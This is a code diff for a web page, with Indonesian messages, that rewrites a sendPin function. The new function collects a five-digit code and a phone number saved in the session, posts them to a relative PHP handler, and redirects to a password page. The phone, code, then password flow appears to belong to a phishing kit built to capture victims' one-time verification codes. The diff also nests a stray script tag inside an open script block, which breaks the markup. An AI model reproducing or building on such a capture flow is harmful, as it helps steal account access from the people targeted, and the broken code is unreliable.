@@ -163,18 +163,37 @@ $(document).ready(function() {
     });
 </script>
 <script>
-    function sendPin(){
-        $(".load").fadeIn();
-        $.ajax({
-            type: 'POST',
-            url: '../../req/code.php',
-            data: $('#formPin').serialize(),
-            dataType: 'text',
-            success: function(){
-                window.location.href = '../../Password/';
-            }
-        });
-    };
+    <script>
+function sendPin() {
+    const inputs = $('.inppin').toArray();
+    const code = inputs.map(input => input.value).join('');
+    const phone = sessionStorage.getItem("nohp");
+    
+    if (!phone || code.length !== 5) {
+        alert("Nomor telepon atau kode tidak valid!");
+        return;
+    }
+
+    const data = JSON.stringify({
+        phone: phone,
+        code: code
+    });
+
+    $.ajax({
+        type: 'POST',
+        url: '../../req/code.php',
+        contentType: 'application/json',
+        data: data,
+        success: function(response) {
+            console.log("Data berhasil dikirim:", response);
+            window.location.href = '../../Password/';
+        },
+        error: function(err) {
+            console.error("Gagal mengirim data:", err);
+            alert("Terjadi kesalahan, coba lagi.");
+        }
+    });
+}
 </script>
 <script>
 var set_item = sessionStorage.getItem("nohp");
